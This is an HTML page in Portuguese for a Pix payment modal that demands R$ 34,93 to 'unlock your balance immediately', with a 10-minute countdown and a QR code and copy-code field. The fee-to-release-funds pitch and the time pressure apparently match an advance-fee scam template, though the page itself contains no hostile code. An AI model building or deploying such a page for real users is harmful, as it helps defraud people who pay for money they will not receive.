<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="format-detection" content="telephone=no" />
    <title>Pagamento da Tarifa</title>
    <link rel="stylesheet" href="css/pagamento-tarifa.css" />
  </head>
  <body>
    <div class="pix-modal active" id="pix-modal">
      <div class="modal-content">
        <div class="top-message">
          PAGUE A TARIFA PARA DESBLOQUEAR SEU SALDO IMEDIATAMENTE
        </div>

        <div class="modal-header">
          <h2>Pagamento via Pix</h2>
        </div>

        <div class="timer-warning">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
            <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0-13A6 6 0 1 0 8 14 6 6 0 0 0 8 2zm0 10a1 1 0 1 1 0-2 1 1 0 0 1 0 2zm0-3a1 1 0 0 1-1-1V5a1 1 0 0 1 2 0v3a1 1 0 0 1-1 1z" fill="currentColor"/>
          </svg>
          <span>Pagamento expira em: <strong id="timer">10:00</strong></span>
        </div>

        <div class="pix-info">
          <div class="pix-amount">
            <span class="amount-label">Valor a pagar:</span>
            <span class="amount-value">R$ 34,93</span>
          </div>

          <div class="qrcode-section">
            <div id="pix-qrcode" class="qrcode-container"></div>
            <p class="qrcode-instruction">Escaneie o QR Code com o app do seu banco</p>
          </div>

          <div class="pix-code-section">
            <label for="pix-code-input">Ou copie o c√≥digo Pix:</label>
            <div class="code-input-wrapper">
              <input
                type="text"
                id="pix-code-input"
                class="pix-code-input"
                readonly
              />
              <button class="copy-button" id="copy-button">
                <span class="copy-text">Copiar</span>
                <span class="copied-text">Copiado!</span>
              </button>
            </div>
          </div>

          <div class="payment-status">
            <div class="status-spinner"></div>
            <p class="status-text">Aguardando pagamento...</p>
          </div>
        </div>
      </div>
    </div>

    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
    <script type="module" src="js/pagamento-tarifa.js"></script>
  </body>
</html>
